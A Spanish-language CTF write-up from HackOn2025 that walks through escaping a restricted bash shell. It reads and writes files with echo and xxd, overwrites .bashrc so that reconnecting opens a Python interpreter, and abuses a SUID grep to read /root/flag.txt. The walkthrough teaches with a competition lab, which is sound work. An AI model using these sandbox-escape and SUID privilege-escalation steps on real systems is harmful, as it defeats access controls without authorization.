---
title: SandBox - HackOn2025
author: Kesero
description: Reto misc basado en escapar de una rbash y leer flag.txt
date: 2025-02-24 00:00:00 +0000
categories: [Writeups Competiciones Nacionales, Miscelánea N]
tags: [Misc, Misc - Rbash, Writeups, Dificultad - Media]
pin: false
math: true
mermaid: true
image:
  path: https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Nacionales_Writeups/2025/HackOn2025/Misc/SandBox/3.png
  lqip: 
  alt: 
comments: true
---

Autor del reto: `HugoBond`

Dificultad: <font color=orange>Media</font>

## Enunciado

"Not even the dockerfile, just rawdogged like old times"

## Archivos

En este reto, solo tenemos una conexión.

- `Servidor en remoto` : Conexión por ncat.

Archivos utilizados [aquí](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Nacionales_Writeups/2025/HackOn2025/Misc/SandBox).

## Entrando al reto.

Para acceder al entorno del reto, simplemente nos tenemos que conectar mediante `openssl` de la siguiente manera.

    ┌──(kesero㉿kali)-[~]
    └─$ openssl s_client -connect hackon-444ba26d30e4-sandbox-1.chals.io:443

Una vez dentro, se nos desplegará una bash restringida como el usuario `paco`. Nuestro cometido será leer el archivo `flag.txt`, el cual se encuentra dentro del directorio `/root`.

## Solución

Este tipo de retos requiere tiempo y sobre todo probar y probar diferentes comandos para ir depurando posibles vías de ataque.

En este caso, la bash nos permite listar archivos mediante `ls` dentro de nuestra carpeta teníamos una carpeta `bin/` con los comandos que podíamos ejecutar los cuales son los siguientes.

    ┌──(paco@ac3d575b01fb)-[~]
    └─$ ls bin/

    echo  id  ls  ping  pwd  python  whoami  xxd

De todos estos comandos los que nos llama más la atención son `python` y `xxd` ya que con python podemos jugar de distintas formas para obtener una `bash` sin restricciones, pero la intrusión no viene de este modo, ya que el comando `python` está asociado a la ejecución del script `/opt/test.py` el cual imprime lo siguiente por consola.

    ┌──(paco@ac3d575b01fb)-[~]
    └─$ python

    You just lose THE GAME

Como tenemos capacidad para listar directorios con `ls`, podemos listar todo el contenido en el que paco tenga capacidad de lectura. Es en este momento en el que indagaremos por el sistema en busca de información que podamos utilizar a nuestro favor, como rutas de binarios, permisos asociados a los mismos, etc.

Además un truco que podemos aplicar en estos casos, como tenemos el comando `echo`, podemos mostrar el contenido de archivos mediante el siguiente comando.

    ┌──(paco@ac3d575b01fb)-[~]
    └─$ echo $(>.profile)

    # ~/.profile: executed by the command interpreter for login shells. # This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login # exists. # see /usr/share/doc/bash/examples/startup-files for examples. # the files are located in the bash-doc package. # the default umask is set in /etc/profile; for setting the umask # for ssh logins, install and configure the libpam-umask package. #umask 022 # if running bash if [ -n "$BASH_VERSION" ]; then # include .bashrc if it exists if [ -f "$HOME/.bashrc" ]; then . "$HOME/.bashrc" fi fi # set PATH so it includes user's private bin if it exists if [ -d "$HOME/bin" ] ; then PATH="$HOME/bin:$PATH" fi # set PATH so it includes user's private bin if it exists if [ -d "$HOME/.local/bin" ] ; then PATH="$HOME/.local/bin:$PATH" fi

De esta forma podemos listar el contenido de todos los archivos si paco tiene permisos de lectura en ellos.

Llegados a este punto tenemos capacidad de listar directorios y de listar archivos, pero nos falta la capacidad de escribirlos.

Es en este punto donde el comando `xxd` adquiere gran importancia.

Si observamos en la página de `GTFoBins` el comando [xxd](https://gtfobins.github.io/gtfobins/xxd/), podemos escribir archivos y leer archivos (aunque este listado es menos intuitivo ya que parte lo hace en hexadecimal)

Podemos listar archivos mediante

    LFILE=file_to_read
    xxd "$LFILE" | xxd -r

Podemos escribir archivos mediante

    LFILE=file_to_write
    echo DATA | xxd | xxd -r - "$LFILE"

NOTA: Importante aclarar que la escritura se realiza al comienzo del archivo, por lo que si queremos escribir al final tendremos que copiar todo el contenido del mismo y luego nuestra cadena a introducir.

Llegados a este punto podemos salir de la `rbash` de distintos modos. El camino que seguí es que como tenemos capacidad de escritura en los archivos cuyo propietario sea `paco`, directamente podemos escribir en nuestra propia `.bashrc` para escapar de la bash.

Aquí se pueden aplicar varios métodos, podemos exportar el $PATH para que incluya rutas del sistema como /usr/bin (actualmente el usuario paco solo tiene en el path /home/paco/bin/), podemos incrustar comandos o abrirnos distintos entornos de ejecuciones como puede ser vim, nano, etc.

Lo que yo hice fue simplemente escribir en `.bashrc` el intérprete de python libre restricciones el cual está alojado en `/usr/bin/python3.11`, de esta manera al salir de la bash y volver a conectarnos mediante `openssl`, se ejecutará el contenido dentro de  `.bashrc` y por ende se ejecutará el intérprete de `python3.11`. Para ello.

    ┌──(paco@ac3d575b01fb)-[~]
    └─$ echo "exec /usr/bin/python3" | xxd | xxd -r - ".bashrc"

Al salir de la sesión y al volver a conectarnos, podremos ver que efectivamente, tenemos un intérprete de python 3.11.2.

    ┌──(kesero㉿kali)-[~]
    └─$ openssl s_client -connect hackon-444ba26d30e4-sandbox-1.chals.io:443

    rbash: cannot set terminal process group (7): Inappropriate ioctl for device
    rbash: no job control in this shell
    Python 3.11.2 (main, Nov 30 2024, 21:22:50) [GCC 12.2.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>>

Llegados a este punto podemos ejecutar comandos en el sistema mediante `import os;`, pero seguimos sin tener permisos para leer el directorio `/root`, es por ello que entra el juego la escalada de privilegios para poder leer `/root/flag.txt`

Listando con `ls -la` los permisos de los binarios alojados en `/usr/bin/` podemos listar los privilegios `SUID` que tiene el sistema y observamos que hay varios binarios que tiene permisos `SUID` cuyo propietario es `root`, por lo que podemos manipularlos para ejecutar dicho binario con máximos privilegios.

En este punto, yo utilicé el binario `grep` ya que cuenta con permisos `SUID` y nuevamente si utilizamos la página de `GTFoBins` podemos escalar privilegios con el comando [grep](https://gtfobins.github.io/gtfobins/grep/) si este cuenta con el permiso asociado.

    LFILE=file_to_read
    ./grep '' $LFILE

Como podemos ejecutar comandos deste el intérprete de python, utilizamos `grep` como medio de escalada de privilegios y a su vez para leer el archivo `flag.txt` para observar finalmente la flag.

    >>> import os
    >>> os.system("grep '' " + "/root/flag.txt")

    HackOn{D1sp4ro_4l_41r3_y_4_donde_ca1g4,_l4_pen4_deb4jo_del_Stone_Isl4nd}


## Flag

`HackOn{D1sp4ro_4l_41r3_y_4_donde_ca1g4,_l4_pen4_deb4jo_del_Stone_Isl4nd}`